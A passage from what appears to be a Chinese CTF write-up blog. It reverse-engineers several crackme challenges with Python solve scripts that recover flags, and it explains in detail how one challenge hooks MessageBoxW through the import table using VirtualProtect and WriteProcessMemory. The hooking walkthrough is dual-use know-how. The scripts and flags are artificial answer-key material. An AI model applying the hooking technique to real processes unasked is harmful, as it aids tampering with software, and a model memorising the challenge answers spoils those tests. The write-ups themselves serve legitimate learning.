class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = <span class="built_in">map</span>(<span class="built_in">ord</span>, f.read())</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;syclover&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">data[i] ^= key[i % <span class="built_in">len</span>(key)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ori.apk&quot;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line">g.write(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, data)))</span><br></pre></td></tr></table></figure><p>得到一个新的 apk，再用 jadx 打开，找到类 sctf.demo.myapplication.s，按钮对应的函数：</p><p><img src="../img/SCTF2019Strangeapk/3.png" alt="SCTF2019Strangeapk"></p><p>后 18 个字符在 sctf.demo.myapplication.t 类中重写的 onActivityResult 方法里验证：</p><p><img src="../img/SCTF2019Strangeapk/4.png" alt="SCTF2019Strangeapk"></p><p>encode 函数很简单，这里就不贴出来了，直接贴脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">piece1 = base64.b64decode(<span class="string">&quot;c2N0ZntXM2xjMG1l&quot;</span>)</span><br><span class="line">piece2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = <span class="string">&quot;~8t808_8A8n848r808i8d8-8w808r8l8d8&#125;8&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(target), <span class="number">2</span>):</span><br><span class="line">piece2 += target[i]</span><br><span class="line"><span class="built_in">print</span> piece1 + piece2</span><br></pre></td></tr></table></figure><br><h3 id="MRCTF2020-PixelShooter-JVM-apk-NET-Unity游戏"><a href="#MRCTF2020-PixelShooter-JVM-apk-NET-Unity游戏" class="headerlink" title="[MRCTF2020]PixelShooter | JVM,apk,.NET,Unity游戏"></a>[MRCTF2020]PixelShooter | JVM,apk,.NET,Unity游戏</h3><p>jadx 打开可以发现很多 Unity 的类，那就找一下 Assembly-CSharp.dll 被打包在哪里了，解压出来直接搜索，发现在路径 assets/bin/Data/Managed 下。dnSpy 打开该 dll，找到 GameController 类的 GameOver 方法：</p><p><img src="../img/MRCTF2020PixelShooter/1.png" alt="MRCTF2020PixelShooter"></p><p>发现有更新 UI 的语句，在 UIController 类的 GameOver 方法中找到 flag：</p><p><img src="../img/MRCTF2020PixelShooter/2.png" alt="MRCTF2020PixelShooter"></p><br><h3 id="安洵杯-2019-crackMe-x86-exe-hook-Windows异常机制-sm4"><a href="#安洵杯-2019-crackMe-x86-exe-hook-Windows异常机制-sm4" class="headerlink" title="[安洵杯 2019]crackMe | x86,exe,hook,Windows异常机制,sm4"></a>[安洵杯 2019]crackMe | x86,exe,hook,Windows异常机制,sm4</h3><p>程序中使用 IAT hook 技术，将导入表中的 MessageBoxW 函数替换为 sub_411023，具体怎么实现 hook 的后面再说，现在只需知道 main 函数中调用 MessageBoxW 时实际是调用了 sub_411023：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/1.png" alt="安洵杯2019crackMe"></p><p>sub_411023 会跳转到 sub_412AB0，该函数干的事就是将 base64 编码表的大小写交换，并且注册一个 VEH：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/2.png" alt="安洵杯2019crackMe"></p><p>之后返回到 main 函数，安装了一个 SEH，然后故意引发了一个异常：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/3.png" alt="安洵杯2019crackMe"></p><p>众所周知，Windows 用户态异常发生先找调试器，没有再找 VEH，VEH 处理不了再找 SEH， SEH 还处理不了找 UEF（UnhandledExceptionFilter，用户设置的 TopLevelExceptionFilter 在该阶段被调用）。前面已经注册了 VEH 和 SEH，所以先走 VEH：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/4.png" alt="安洵杯2019crackMe"></p><p>VEH 干了两件事</p><ul><li>用长度为 16 个字节的 key 对 sm4 加密进行初始化</li><li>设置 UEF 为 TopLevelExceptionFilter</li></ul><p>注意，返回值为 0（EXCEPTION_CONTINUE_SEARCH），表示此 VEH 没能处理这个异常，接着异常交给 SEH：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/5.png" alt="安洵杯2019crackMe"></p><p>SEH 中对输入进行了 sm4 加密，结果存在 output 中，返回值为 1（EXCEPTION_DISPOSITION::ExceptionContinueSearch），表示 SEH 仍没能处理这个异常，故异常递交给 TopLevelExceptionFilter：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/6.png" alt="安洵杯2019crackMe"></p><p>变种 base64 编码函数 sub_41126C 跳转 sub_413090，该函数有两点要注意：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/7.png" alt="安洵杯2019crackMe"></p><p>最后异常返回，去到 sub_411136 执行比较</p><p>整理一下程序流程：IAT hook -&gt; main -&gt; printf -&gt; scanf_s -&gt; MessageBoxW(被替换成 sub_411023，注册了 VEH) -&gt; 安装 SEH -&gt; 异常发生 -&gt; VEH(sub_412F40，设置了 UEF) -&gt; SEH(sub_412EA0) -&gt; UEF(sub_412C30) -&gt; sub_411136</p><p>解题脚本（sm4 库安装：pip install sm4）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sm4</span><br><span class="line"></span><br><span class="line">ori = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">now = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_412AB0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ori:</span><br><span class="line">tmp = <span class="built_in">ord</span>(c)</span><br><span class="line"><span class="keyword">if</span> <span class="number">97</span> &lt;= tmp &lt;= <span class="number">122</span>:</span><br><span class="line">now += <span class="built_in">chr</span>(tmp - <span class="number">32</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">65</span> &lt;= tmp &lt;= <span class="number">90</span>:</span><br><span class="line">now += <span class="built_in">chr</span>(tmp + <span class="number">32</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">now += c</span><br><span class="line"></span><br><span class="line">ori += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">now = now[<span class="number">24</span>:] + now[:<span class="number">24</span>] + <span class="string">&#x27;!&#x27;</span><span class="comment"># sub_4110FF -&gt; sub_412760</span></span><br><span class="line"><span class="comment"># ori = ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span></span><br><span class="line"><span class="comment"># now = yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_412C30</span></span><br><span class="line">str2 = <span class="string">&quot;1UTAOIkpyOSWGv/mOYFY4R!!&quot;</span></span><br><span class="line">str2_swap = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(str2), <span class="number">2</span>):</span><br><span class="line">str2_swap += str2[i+<span class="number">1</span>] + str2[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_41126C -&gt; sub_413090</span></span><br><span class="line">b64string = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> str2_swap:</span><br><span class="line">b64string += ori[now.find(s)]</span><br><span class="line">sm4_encoded = base64.b64decode(b64string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_412EA0</span></span><br><span class="line">key = sm4.SM4Key(<span class="string">b&quot;where_are_u_now?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> key.decrypt(sm4_encoded)</span><br></pre></td></tr></table></figure><br><p>PS.  本题的 IAT hook 是怎样完成的？</p><p>与 elf 类似，exe 的 main 函数并非程序入口点，main 函数是由 start 函数调用 mainCRTStartup，完成一系列初始化后才调用的。初始化过程中会<strong>调用 initterm/initterm_e 函数来初始化所有全局和静态 C++ 类对象的构造函数</strong>，可以在 rdata 段的函数指针表中找到 dd offset sub_411235：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/8.png" alt="安洵杯2019crackMe"></p><p>该函数是某个类的构造函数，并且出题人将该类的一个对象声明在了全局变量区域或声明为静态对象，导致 sub_411235 在 mainCRTStartup 的初始化中被调用</p><p>知道了 hook 函数被调用的时机，现在来理理函数的逻辑。sub_411235 跳转到 sub_411E40：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/9.png" alt="安洵杯2019crackMe"></p><p>获取了 exe 基址并调用 sub_41114A，传递了三个参数：</p><ul><li>exe 基址</li><li>要 hook 的函数所在的 dll 名 - User32.dll</li><li>要 hook 的函数名 - MessageBoxW</li></ul><p>sub_41114A 跳转 sub_412DF0：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/10.png" alt="安洵杯2019crackMe"></p><p>调用 LoadLibrary 加载 user32.dll，返回 user32.dll 的基址存到 hModule 中；调用 GetProcAddress，传入 hModule 与 MessageBoxW 函数名，得到 MessageBoxW 函数的内存地址；调用 sub_41118B，传入三个参数：</p><ul><li>exe 基址</li><li>要 hook 的函数所在的 dll 名 - User32.dll</li><li>MessageBoxW 的内存地址</li></ul><p>sub_41118B 跳转 sub_4127B0（对符号进行还原）：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/11.png" alt="安洵杯2019crackMe"></p><p>内容有些多，一点点来看：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optional_header = (IMAGE_OPTIONAL_HEADER32 *)(baseAddr + *(_DWORD *)(baseAddr + <span class="number">60</span>) + <span class="number">24</span>);</span><br></pre></td></tr></table></figure><p>先将 baseAddr（exe基址）类型转化为 IMAGE_DOS_HEADER 指针，*(_DWORD *)(baseAddr + 60) 就是 baseAddr-&gt;e_lfanew，该值为 IMAGE_NT_HEADERS 的偏移，加上 baseAddr 就是 IMAGE_NT_HEADERS 结构体的起始地址，再加上 24，就是 IMAGE_NT_HEADERS.OptionalHeader 字段的地址，这样就得到了 optional_header</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import_descriptor = (IMAGE_IMPORT_DESCRIPTOR *)(optional_header-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress + baseAddr);</span><br></pre></td></tr></table></figure><p>optional_header-&gt;DataDirectory[1] 就是 IAT（导入表）对应的 IMAGE_DATA_DIRECTORY 结构体，访问字段 VirtualAddress 获得 IAT 起始地址的偏移，加上 baseAddr 得到 IAT 表的地址。IAT 表是由一个个 IMAGE_IMPORT_DESCRIPTOR 结构体组成的数组，一个 dll 对应这么一个 IMAGE_IMPORT_DESCRIPTOR 结构体。重新审视这个 for 循环：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/12.png" alt="安洵杯2019crackMe"></p><p>很清楚，目的就是找到 user32.dll 对应的 IMAGE_IMPORT_DESCRIPTOR 结构体地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thunk_data = (IMAGE_THUNK_DATA32 *)(import_descriptor-&gt;FirstThunk + baseAddr);</span><br></pre></td></tr></table></figure><p>找到以后，访问字段 FirstThunk，加上 baseAddr，获得由多个 IMAGE_THUNK_DATA 结构体组成的 thunk_data 数组，从该 dll 中导入了多少个函数，就有多少个 IMAGE_THUNK_DATA 结构体。那么下面这个 while 循环也不难理解了：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/13.png" alt="安洵杯2019crackMe"></p><p>该循环遍历 thunk_data 数组，找到 MessageBoxW 对应的 IMAGE_THUNK_DATA 结构体地址，现在只需要将 IMAGE_THUNK_DATA 的该字段覆写为 sub_411023 函数的地址，再调用 MessageBoxW 时，就会跳到 sub_411023 去了！</p><p>要想往一个内存地址里写东西，一般需要三个步骤：</p><ul><li>修改该地址所在内存页的保护属性，至少改成可读可写，记下原页面属性</li><li>写入数据</li><li>还原原页面属性</li></ul><p>覆写的部分：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019crackMe/14.png" alt="安洵杯2019crackMe"></p><p>thunk_data 现在是找到的 MessageBoxW 的 IMAGE_THUNK_DATA 结构体地址，右移再左移是为了使低 12 位清零，计算出该地址所在内存页的起始地址（内存页 4K 对齐）；VirtualQuery 获取该内存区域的属性到 Buffer 中（主要是为了通过 Buffer.RegionSize 获取内存区域的大小）；VirtualProtect 修改这片内存区域的保护属性为 0x40（可读可写可执行）；WriteProcessMemory 在 thunk_data 处写入 4 个字节（sub_411023 函数的地址）；最后的 VirtualProtect 还原原来的页面保护属性，大功告成！</p><p>之后 mainCRTStartup 完成剩余初始化任务，调用 main 函数。main 中再调用 MessageBoxW 时，就会跳到 sub_411023 去了</p><br><h3 id="网鼎杯-2020-青龙组-jocker-x86-exe"><a href="#网鼎杯-2020-青龙组-jocker-x86-exe" class="headerlink" title="[网鼎杯 2020 青龙组]jocker | x86,exe"></a>[网鼎杯 2020 青龙组]jocker | x86,exe</h3><p>找到 main 函数，F5 发现栈不平衡，Options -&gt; General -&gt; Disassembly 界面勾选上 Stack pointer，找到 IDA 分析错误的 0x401833 行，Alt + k 将 sp 的变化值改为 0：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84jocker/1.png" alt="网鼎杯2020青龙组jocker"></p><p>同理，将 0x401847 行的 sp 变化值改为 0，再 F5 可以看见伪代码：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84jocker/2.png" alt="网鼎杯2020青龙组jocker"></p><p>python 写个 idc 脚本在 ida 中还原 encrypt 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x401500</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">187</span>):</span><br><span class="line">b = get_bytes(addr + i, <span class="number">1</span>)</span><br><span class="line">idc.PatchByte(addr + i, <span class="built_in">ord</span>(b) ^ <span class="number">0x41</span>)</span><br></pre></td></tr></table></figure><p>在 ida 中选择 File -&gt; Script File…，选择该脚本运行，来到 encypt 函数，先将函数 Undefine，并从上到下，在其解释为 db xx 指令处按 c，强转为汇编代码，保证整个函数内没有 db xx 这样的指令。再在 0x401500 处右键创建函数，F5：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84jocker/3.png" alt="网鼎杯2020青龙组jocker"></p><p>逻辑比较简单，直接上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">origin = <span class="string">&quot;&quot;</span></span><br><span class="line">key = <span class="string">&quot;hahahaha_do_you_find_me?&quot;</span></span><br><span class="line">target = <span class="string">&quot;\x0E\x0D\x09\x06\x13\x05XV&gt;\x06\x0C&lt;\x1FW\x14kWY\x0D&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">origin += <span class="built_in">chr</span>(<span class="built_in">ord</span>(target[i]) ^ <span class="built_in">ord</span>(key[i]))</span><br><span class="line"><span class="built_in">print</span> origin</span><br></pre></td></tr></table></figure><p>获得 flag 前 19 位，接着同理处理 finally 函数，得到：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84jocker/4.png" alt="网鼎杯2020青龙组jocker"></p><p>莫名其妙的一个函数，没看到哪里能搞到最后 5 位，好像就函数开头的 5 个赋值有点关系了，flag 最后肯定是 }，那就拿 58 和 ord(‘}’) 来异或，得到的值再与这 5 个值逐一异或，得到最后 5 位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tail = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = [<span class="number">37</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">58</span>]</span><br><span class="line">xor = last[-<span class="number">1</span>] ^ <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">tail += <span class="built_in">chr</span>(last[i] ^ xor)</span><br><span class="line"><span class="built_in">print</span> tail</span><br></pre></td></tr></table></figure><p>想不到这里也可以写个脚本来爆破，就 5 位，空间很小</p><br><h3 id="2019红帽杯-childRE-x86-exe-二叉树"><a href="#2019红帽杯-childRE-x86-exe-二叉树" class="headerlink" title="[2019红帽杯]childRE | x86,exe,二叉树"></a>[2019红帽杯]childRE | x86,exe,二叉树</h3><p>shift + F12，查找字符串 “flag{MD5(your input)}” 的交叉引用，来到函数 sub_140001610，该函数依照逻辑可以分为两个部分。第一个部分：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFchildRE/1.png" alt="2019红帽杯childRE"></p><p>BuildTree 函数通过输入建立一个 5 层的满二叉树（正好 31 个结点），并返回根节点。这块儿可以通过动调得知树的构建顺序（层序从上到下，层内从左到右），输入 base64 编码表前 31 位（ABCDEFG…），建出来的树长这样：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFchildRE/2.png" alt="2019红帽杯childRE"></p><p>后面的那个 if 判断里干的事其实就是整个树的后序遍历，将遍历结果存到 name 数组。不是很明白为什么他不直接写 Postorder(rootNode)，而是后序遍历左右子树，最后再填入根节点，这效果不一样吗（地铁老人看手机</p><p>第二个部分：</p><p><img src="../img/2019%E7%BA%A2%E5%B8%BD%E6%9D%AFchildRE/3.png" alt="2019红帽杯childRE"></p><p>可以先通过下面的 do…while 循环求出这个长度为 62 的字符串 outputString：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&quot;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&#x27;ASDFGHJKL:\&quot;ZXCVBNM&lt;&gt;?zxcvbnm,./&quot;</span></span><br><span class="line">array1 = <span class="string">&quot;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&quot;</span></span><br><span class="line">array2 = <span class="string">&quot;55565653255552225565565555243466334653663544426565555525555222&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">62</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line"><span class="keyword">if</span> table[j % <span class="number">23</span>] == array1[i]:</span><br><span class="line"><span class="keyword">if</span> table[j / <span class="number">23</span>] == array2[i]:</span><br><span class="line">s += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> s</span><br><span class="line"><span class="comment"># private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</span></span><br></pre></td></tr></table></figure><p>得到一个函数签名 <code>private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</code>，UnDecorateSymbolName 函数将被修饰过的函数签名还原，得到上面这个未被修饰的字符串（关于符号修饰和函数签名详见 <a href="https://www.cnblogs.com/wfwenchao/articles/4140388.html">博客园</a>）。那现在需要将这个函数签名进行符号修饰，有两种方法 —— 按照编译器的符号修饰规则自己修饰、VS 写个程序通过 <code>__FUNCDNAME__</code> 宏定义查看</p><p>第一种学习成本太高直接 pass。第二种方法的 C++ 程序：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ROPxx</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">ROPxx</span>() &#123;</span><br><span class="line"><span class="built_in">My_Aut0_PWN</span>(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">My_Aut0_PWN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; __FUNCDNAME__ &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ROPxx* ropxx = <span class="keyword">new</span> <span class="built_in">ROPxx</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>请务必在 x86 而非 x64 平台下编译运行</strong>，否则会导致结果不对。要问为什么的话，x64 寄存器多，所以不按 x86 的那套函数调用约定来做。注意到这里函数签名里的调用约定是 __thiscall，这是 x86 下的类方法调用约定，如果在 x64 下编译会被编译器强转为 cdecl，结果自然错误。</p><p>运行得到符号修饰结果 <code>?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z</code>，长度 31，符合前面的推理，且该字符串应该是输入后序遍历的结果。写个程序得到输入（这里顺带 md5 了）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target = <span class="string">&quot;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&quot;</span></span><br><span class="line"></span><br><span class="line">ori = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ12345&quot;</span></span><br><span class="line">new = <span class="string">&quot;PQHRSIDTUJVWKEBXYLZ1MF23N45OGCA&quot;</span></span><br><span class="line">idx = [<span class="number">0</span>] * <span class="number">31</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">idx[i] = ori.find(new[i])</span><br><span class="line"></span><br><span class="line">Input = [<span class="string">&#x27;&#x27;</span>] * <span class="number">31</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(idx)):</span><br><span class="line">Input[idx[i]] = target[i]</span><br><span class="line">Input = <span class="string">&#x27;&#x27;</span>.join(Input)</span><br><span class="line"><span class="built_in">print</span> hashlib.md5(Input).hexdigest()</span><br></pre></td></tr></table></figure><br><h3 id="FlareOn1-Bob-Doge-x86-exe-NET"><a href="#FlareOn1-Bob-Doge-x86-exe-NET" class="headerlink" title="[FlareOn1]Bob Doge | x86,exe,.NET"></a>[FlareOn1]Bob Doge | x86,exe,.NET</h3><p>双击 C1.exe，将题目解压到任意文件夹，得到 Challenge1.exe，exeinfo pe 查一下，得知是 .NET 框架的程序。dnSpy 加载，在 XXXXXXXXXXXXXXX.Form1 类中找到 btnDecode_Click 方法，该方法就是 DECODE 按钮的回调：</p><p><img src="../img/FlareOn1BobDoge/1.png" alt="FlareOn1BobDoge"></p><p>右键 -&gt; 编辑方法，将函数 patch 成如下形式（只留第一个 foreach，同时 lbl_title 设置为 text）：</p><p><img src="../img/FlareOn1BobDoge/2.png" alt="FlareOn1BobDoge"></p><p>点击编译、保存全部（ctrl + shift + s）。再运行一遍，点击 DECODE! 得到 flag：</p><p><img src="../img/FlareOn1BobDoge/3.png" alt="FlareOn1BobDoge"></p><p>当然也可以 dnSpy 动态调试得到 flag</p><br><h3 id="安洵杯-2019-game-x86-elf-ollvm平坦化-数独"><a href="#安洵杯-2019-game-x86-elf-ollvm平坦化-数独" class="headerlink" title="[安洵杯 2019]game | x86,elf,ollvm平坦化,数独"></a>[安洵杯 2019]game | x86,elf,ollvm平坦化,数独</h3><p>新去平坦化脚本 <a href="https://github.com/cq674350529/deflat">github</a>，原来腾讯安全应急响应中心的那个 deflat.py 对环境依赖太高，不推荐使用。github 的这个只需要 python3 和 angr 就能用</p><p>把 main、general_inspection、blank_num、trace、check1、check2、check3 函数都去平坦化了（trace 函数去平坦化失败，但影响不大）。下面给出去掉 main 平坦化的命令行：</p><p><code>python deflat.py -f attachment --addr 0x4006F0</code></p><p>再用 ida 打开 attachment_recovered，可以发现 main 的逻辑变正常了：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019game/1.png" alt="安洵杯2019game"></p><p>总的来说，程序中有两个数独数组（9 * 9），一个是 sudoku，另一个是 D0g3，它们的初始元素完全相同，都有 40 个没有填的空。不过 trace 函数将 sudoku 填写好了，check1 函数对输入做变换得到要填写的数字序列：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019game/2.png" alt="安洵杯2019game"></p><p>check3 中调用 check2，填写 D0g3 数组，然后与 trace 函数填写好的 sudoku 数组进行逐一比较：</p><p><img src="../img/%E5%AE%89%E6%B4%B5%E6%9D%AF2019game/3.png" alt="安洵杯2019game"></p><p>那正常输入 check1 过后得到的数字序列可以通过动调直接从 sudoku 中提取出来，得到 <code>4693641762894685722843556137219876255986</code></p><p>然后再做 check1 的逆向操作得到输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">num_seq = <span class="string">&quot;4693641762894685722843556137219876255986&quot;</span></span><br><span class="line">num_seq = <span class="built_in">map</span>(<span class="built_in">ord</span>, 